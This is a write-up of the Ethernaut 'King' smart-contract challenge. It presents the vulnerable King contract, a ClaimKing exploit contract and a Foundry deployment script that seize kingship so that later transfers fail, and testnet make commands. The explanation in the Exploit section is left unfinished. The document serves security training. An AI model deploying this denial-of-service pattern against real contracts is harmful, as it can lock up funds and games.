# Level 9 - King ⏺⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/9" %}

### Level Setup

{% hint style="info" %}
The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/levels/King.sol" %}

{% code lineNumbers="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```
{% endcode %}

### Exploit

The

1.

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-9

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-9

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Contract" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/main/src/Level9.sol" %}

{% code title="src/Level9.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IKing {
    function prize() external view returns (uint256);
}

// ================================================================
// │                         LEVEL 9 - KING                       │
// ================================================================
contract ClaimKing {
    constructor(address _targetContractAddress) payable {
        IKing king = IKing(_targetContractAddress);
        uint256 attackValue = king.prize() + 1 wei;
        if (attackValue > address(this).balance) revert("Not enough funds");

        // Attack contract
        (bool success,) = _targetContractAddress.call{value: attackValue}("");
        if (!success) revert("Call failed");

        // Refund remaining balance
        (bool refundSuccess,) = address(msg.sender).call{value: address(this).balance}("");
        if (!refundSuccess) revert("Refund call failed");
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/main/script/Level9.s.sol" %}

{% code title="script/Level9.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";
import {ClaimKing} from "../src/Level9.sol";

// ================================================================
// │                         LEVEL 9 - KING                       │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        new ClaimKing{value: 1 ether}(targetContractAddress);
        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

2. Submit instance... 🥳

### Completion Message

{% hint style="info" %}
Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that actually happened — a real hack or a real bug.

In this case, see: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html).
{% endhint %}

### Notes

* Executing everything in the constructor removes points of failure e.g. if the prize was calculated before sending, then the transaction was pending for a few blocks, it would no longer be the correct value. So it's better to calculate as much as possible on chain, even if it costs more gas that off-chain calculations, as it's more important that it actually goes through (and the check can be right at the start to minimize wasted gas if it does revert)
